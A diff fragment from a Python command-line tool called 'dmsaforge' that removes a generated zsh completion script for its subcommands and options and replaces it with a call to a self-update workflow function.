-_dmsaforge() {
-  local -a commands root_opts plan_opts assess_opts add_opts verify_opts delete_opts update_opts action_names
-  commands=(%s)
-  root_opts=(%s)
-  plan_opts=(%s)
-  assess_opts=(%s)
-  add_opts=(%s)
-  verify_opts=(%s)
-  delete_opts=(%s)
-  update_opts=(%s)
-  action_names=(%s)
-  if (( CURRENT == 2 )); then
-    _describe 'command' commands
-    _describe 'option' root_opts
-    return
-  fi
-  if [[ "${words[2]}" == "plan" && CURRENT == 3 ]]; then
-    _describe 'action' action_names
-    _describe 'option' plan_opts
-    return
-  fi
-  case "${words[2]}" in
-    assess) _describe 'option' assess_opts ;;
-    add) _describe 'option' add_opts ;;
-    verify) _describe 'option' verify_opts ;;
-    delete) _describe 'option' delete_opts ;;
-    update) _describe 'option' update_opts ;;
-    plan)
-      case "${words[3]}" in
-        assess) _describe 'option' assess_opts ;;
-        add) _describe 'option' add_opts ;;
-        verify) _describe 'option' verify_opts ;;
-        delete) _describe 'option' delete_opts ;;
-        *) _describe 'option' plan_opts ;;
-      esac
-      ;;
-    *) _describe 'option' root_opts ;;
-  esac
-}
-compdef _dmsaforge dmsaforge
-''' % (
-        ' '.join('"%s:%s"' % (command, ACTION_SUMMARY.get(command, command)) for command in ACTION_CHOICES) + ' "plan:dry-run shorthand" "update:update current environment"',
-        ' '.join('"%s"' % option for option in root_options.split()),
-        ' '.join('"%s"' % option for option in plan_options.split()),
-        ' '.join('"%s"' % option for option in assess_options.split()),
-        ' '.join('"%s"' % option for option in add_options.split()),
-        ' '.join('"%s"' % option for option in verify_options.split()),
-        ' '.join('"%s"' % option for option in delete_options.split()),
-        ' '.join('"%s"' % option for option in update_options.split()),
-        ' '.join('"%s"' % action for action in ACTION_CHOICES),
+    return run_update_workflow(
+        options,
+        current_version=TOOL_VERSION,
+        package_version=__version__,
+        tool_name=TOOL_NAME,
+        default_source=DEFAULT_UPDATE_SOURCE,
+        version_url=DEFAULT_UPDATE_VERSION_URL,
+        should_show_banner=should_show_banner,
+        print_banner=print_startup_banner,
+        runner=subprocess.run,
     )
 
 
